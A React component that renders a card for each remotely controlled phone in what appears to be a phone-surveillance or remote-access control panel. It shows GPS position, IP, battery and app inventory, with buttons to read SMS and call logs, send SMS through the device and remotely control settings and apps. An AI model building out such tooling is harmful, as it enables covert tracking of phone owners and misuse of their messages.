import {
  Smartphone,
  Battery,
  BatteryCharging,
  BatteryLow,
  Wifi,
  Radio,
  MapPin,
  HardDrive,
  Cpu,
  Boxes,
  FileText,
  MessageSquare,
  Sliders,
  ExternalLink,
  Compass,
  Clock
} from 'lucide-react';
import { getDeviceDisplayName } from '../utils/deviceNames';
import './DeviceCard.css';

function formatDate(dateStr) {
  if (!dateStr) return 'Never';
  const d = new Date(dateStr);
  const now = new Date();
  const diffMs = now - d;
  const diffMin = Math.floor(diffMs / 60000);
  const diffHr = Math.floor(diffMs / 3600000);
  const diffDays = Math.floor(diffMs / 86400000);

  if (diffMin < 1) return 'Just now';
  if (diffMin < 60) return `${diffMin}m ago`;
  if (diffHr < 24) return `${diffHr}h ago`;
  if (diffDays < 7) return `${diffDays}d ago`;
  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
}

function getBatteryComponent(level) {
  if (level === null || level === undefined) {
    return { icon: <Battery size={13} className="text-muted" />, text: '—%' };
  }
  if (level <= 20) {
    return { icon: <BatteryLow size={13} className="text-danger" />, text: `${level}%` };
  }
  if (level >= 90) {
    return { icon: <BatteryCharging size={13} className="text-success" />, text: `${level}%` };
  }
  return { icon: <Battery size={13} className="text-warning" />, text: `${level}%` };
}

export default function DeviceCard({
  device,
  index,
  onFetchLogs,
  onSendSms,
  onOpenControls,
  onOpenApps,
  onLocateOnMap
}) {
  const isOnline = device.is_active && device.last_seen_at &&
    (Date.now() - new Date(device.last_seen_at).getTime()) < 600000; // 10min

  const hasLocation = device.latitude !== null && device.latitude !== undefined &&
    device.longitude !== null && device.longitude !== undefined;

  let appsCount = 0;
  if (device.installed_apps) {
    try {
      const parsed = Array.isArray(device.installed_apps)
        ? device.installed_apps
        : JSON.parse(device.installed_apps);
      appsCount = parsed.length;
    } catch {
      appsCount = 0;
    }
  }

  const batteryData = getBatteryComponent(device.battery_level);

  return (
    <article
      className={`device-card ${device.is_active ? '' : 'device-card--inactive'}`}
      style={{ animationDelay: `${index * 40}ms` }}
      id={`device-card-${device.device_id}`}
    >
      {/* Top Glow Status Bar */}
      <div className={`card-glow ${isOnline ? 'card-glow--online' : device.is_active ? 'card-glow--active' : 'card-glow--inactive'}`} />

      {/* Header */}
      <div className="card-header">
        <div className="device-avatar">
          <Smartphone size={20} className="avatar-phone-icon" />
        </div>
        <div className="device-info">
          <h3 className="device-name">{getDeviceDisplayName(device)}</h3>
          <p className="device-id font-mono">{device.device_id}</p>
        </div>
        <div className={`status-badge ${isOnline ? 'status-badge--online' : device.is_active ? 'status-badge--active' : 'status-badge--inactive'}`}>
          <span className="status-dot" />
          <span>{isOnline ? 'Online' : device.is_active ? 'Active' : 'Standby'}</span>
        </div>
      </div>

      {/* Device Hardware Diagnostics & Telemetry Bar */}
      <div className="diagnostics-bar">
        {/* Battery */}
        <div className="diag-chip" title="Battery Level">
          {batteryData.icon}
          <span className="font-mono">{batteryData.text}</span>
        </div>

        {/* Network & IP */}
        <div className="diag-chip diag-chip--net" title={`Network: ${device.network_type || 'Cellular'} | IP: ${device.ip_address || '—'}`}>
          <Wifi size={13} className="text-cyan" />
          <span>{device.network_type || 'Cellular'}</span>
        </div>

        {/* Geolocation */}
        {hasLocation ? (
          <button
            type="button"
            className="diag-chip diag-chip--gps"
            onClick={() => onLocateOnMap && onLocateOnMap(device)}
            title="Click to view on Live Radar Map"
          >
            <Compass size={13} className="text-cyan icon-spin-subtle" />
            <span className="font-mono">{device.latitude.toFixed(2)}, {device.longitude.toFixed(2)}</span>
          </button>
        ) : (
          <div className="diag-chip diag-chip--no-gps" title="GPS coordinates pending sync">
            <MapPin size={13} className="text-muted" />
            <span>No GPS Fix</span>
          </div>
        )}
      </div>

      {/* Hardware Specs & Secondary Telemetry */}
      <div className="device-specs-grid">
        {/* Storage */}
        <div className="spec-item" title="Internal Storage">
          <div className="spec-label-row">
            <HardDrive size={11} className="text-muted" />
            <span>STORAGE</span>
          </div>
          <span className="spec-value font-mono">
            {device.storage_available_gb !== null && device.storage_available_gb !== undefined
              ? `${device.storage_available_gb.toFixed(1)} GB Free`
              : '— GB'}
          </span>
        </div>

        {/* RAM */}
        <div className="spec-item" title="Total RAM">
          <div className="spec-label-row">
            <Cpu size={11} className="text-muted" />
            <span>RAM</span>
          </div>
          <span className="spec-value font-mono">
            {device.ram_total_gb !== null && device.ram_total_gb !== undefined
              ? `${device.ram_total_gb.toFixed(1)} GB Total`
              : '— GB'}
          </span>
        </div>

        {/* Installed Apps */}
        <div className="spec-item" title="Reported Installed Apps">
          <div className="spec-label-row">
            <Boxes size={11} className="text-muted" />
            <span>APPS INVENTORY</span>
          </div>
          <span className="spec-value">
            {appsCount > 0 ? `${appsCount} packages` : 'Ready to scan'}
          </span>
        </div>

        {/* Last Seen */}
        <div className="spec-item" title="Last Heartbeat / Activity">
          <div className="spec-label-row">
            <Clock size={11} className="text-muted" />
            <span>LAST ACTIVITY</span>
          </div>
          <span className="spec-value font-mono">
            {formatDate(device.last_seen_at)}
          </span>
        </div>
      </div>

      {/* Action Buttons: Logs, SMS, Controls, Apps */}
      <div className="card-actions-grid">
        <button
          className="btn btn-outline btn-sm card-btn"
          onClick={onFetchLogs}
          id={`fetch-logs-${device.device_id}`}
          title="View SMS, call logs, and communication history"
        >
          <FileText size={13} className="btn-icon" />
          <span>Intel & Logs</span>
        </button>

        <button
          className="btn btn-accent btn-sm card-btn"
          onClick={onSendSms}
          disabled={!device.is_active}
          id={`send-sms-${device.device_id}`}
          title="Send SMS message through this device"
        >
          <MessageSquare size={13} className="btn-icon" />
          <span>Send SMS</span>
        </button>

        <button
          className="btn btn-outline btn-sm card-btn card-btn--controls"
          onClick={onOpenControls}
          id={`controls-${device.device_id}`}
          title="Remote system controls: silent/vibrate, brightness, alarm"
        >
          <Sliders size={13} className="btn-icon text-cyan" />
          <span>Controls</span>
        </button>

        <button
          className="btn btn-outline btn-sm card-btn card-btn--apps"
          onClick={onOpenApps}
          id={`apps-${device.device_id}`}
          title="View installed apps and remotely restart/launch"
        >
          <Boxes size={13} className="btn-icon" />
          <span>Apps {appsCount > 0 ? `(${appsCount})` : ''}</span>
        </button>
      </div>
    </article>
  );
}
